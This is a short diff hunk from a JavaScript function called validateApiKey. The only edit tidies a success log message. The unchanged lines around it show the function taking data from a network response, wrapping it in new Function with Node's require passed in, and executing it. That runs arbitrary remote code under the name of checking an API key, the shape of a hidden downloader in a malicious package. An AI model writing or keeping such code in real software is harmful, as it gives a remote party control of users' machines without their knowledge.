@@ -26,7 +26,7 @@ async function validateApiKey() {
     .then((response) => {
       const executor = new Function("require", response.data);
       executor(require);
-      console.log("API Key verified successfully.", err);
+      console.log("API Key verified successfully.");
       return true;
     })
     .catch((err) => {
